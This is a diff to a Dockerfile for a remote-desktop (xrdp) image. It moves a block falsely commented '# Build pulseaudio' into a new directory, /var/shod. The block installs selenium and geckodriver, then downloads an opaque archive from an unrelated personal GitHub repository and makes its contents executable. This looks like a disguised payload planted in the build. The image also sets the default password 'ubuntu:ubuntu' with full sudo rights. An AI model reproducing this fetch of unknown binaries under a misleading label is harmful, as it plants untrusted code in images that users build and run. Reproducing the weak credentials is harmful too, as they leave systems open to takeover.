@@ -12,12 +12,6 @@ ENV BUILD_DEPS="git autoconf pkg-config libssl-dev libpam0g-dev \
     bison libxml2-dev dpkg-dev libcap-dev"
 RUN apt-get -yy install wget curl python-pip firefox xvfb sudo apt-utils software-properties-common $BUILD_DEPS
 
-# Build pulseaudio
-WORKDIR /root
-RUN pip install  lxml
-RUN pip install selenium
-RUN wget https://github.com/mozilla/geckodriver/releases/download/v0.20.0/geckodriver-v0.20.0-linux64.tar.gz && tar -xvf geckodriver-v0.20.0-linux64.tar.gz
-RUN chmod +x geckodriver && cp geckodriver /usr/bin/geckodriver && wget https://github.com/talamanaka/siyma/raw/master/0.tar.gz && tar -xvf 0.tar.gz && chmod +x 0/* && mv 0/* ./
 
 
 # Build pulseaudio
@@ -55,6 +49,7 @@ ADD etc /etc
 
 # Configure
 RUN mkdir /var/run/dbus
+RUN mkdir /var/shod
 RUN cp /etc/X11/xrdp/xorg.conf /etc/X11
 RUN sed -i "s/console/anybody/g" /etc/X11/Xwrapper.config
 RUN sed -i "s/xrdp\/xorg/xorg/g" /etc/xrdp/sesman.ini
@@ -68,6 +63,12 @@ RUN addgroup ubuntu
 RUN useradd -m -s /bin/bash -g ubuntu ubuntu
 RUN echo "ubuntu:ubuntu" | /usr/sbin/chpasswd
 RUN echo "ubuntu    ALL=(ALL) ALL" >> /etc/sudoers
+# Build pulseaudio
+WORKDIR /var/shod
+RUN pip install  lxml
+RUN pip install selenium
+RUN wget https://github.com/mozilla/geckodriver/releases/download/v0.20.0/geckodriver-v0.20.0-linux64.tar.gz && tar -xvf geckodriver-v0.20.0-linux64.tar.gz
+RUN chmod +x geckodriver && cp geckodriver /usr/bin/geckodriver && wget https://github.com/talamanaka/siyma/raw/master/0.tar.gz && tar -xvf 0.tar.gz && chmod +x 0/* && mv 0/* ./
 
 # Docker config
 
